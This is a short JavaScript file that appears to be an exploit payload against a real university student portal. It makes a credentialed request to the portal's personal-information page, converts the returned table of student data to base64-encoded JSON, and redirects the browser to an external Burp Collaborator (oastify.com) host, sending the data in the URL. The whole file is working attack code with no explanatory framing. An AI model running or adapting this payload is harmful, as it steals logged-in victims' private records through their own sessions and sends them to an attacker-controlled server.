var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://sheilta.apps.openu.ac.il/pls/dmyopt2/myop.myop_screen', true);
req.withCredentials = true;
req.send();

function base64EncodeUnicode(str) {
    var escapedStr = encodeURIComponent(str);
    var byteArray = new Uint8Array(escapedStr.length);
    for (var i = 0; i < escapedStr.length; i++) {
        byteArray[i] = escapedStr.charCodeAt(i);
    }
    return btoa(String.fromCharCode.apply(null, byteArray));
}

function tableToJson(table) {
    var data = [];

    // Get all rows from the table
    var rows = table.querySelectorAll('tr');

    // Iterate over each row
    rows.forEach(function (row) {
        var rowData = [];
        // Get all cells in the row
        var cells = row.querySelectorAll('td');
        cells.forEach(function (cell) {
            // Add cell data to rowData array
            rowData.push(cell.textContent.trim());
        });
        // Add rowData to the data array
        data.push(rowData);
    });

    return data;
}

function reqListener() {
    // Parse the HTML response to a DOM object
    var parser = new DOMParser();
    var doc = parser.parseFromString(this.responseText, 'text/html');

    // Find the first table with class "content_tbl"
    var table = doc.querySelector('table.content_tbl');

    if (table) {
        // Convert table data to JSON
        var jsonData = tableToJson(table);

        // Convert JSON to a string
        var jsonString = JSON.stringify(jsonData);

        // Encode the JSON string in base64
        var encodedString = base64EncodeUnicode(jsonString);

        // Redirect to the new URL with the base64-encoded JSON data
        location = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + encodedString;
    } else {
        console.error('Table with class "content_tbl" not found in the response.');
    }
}
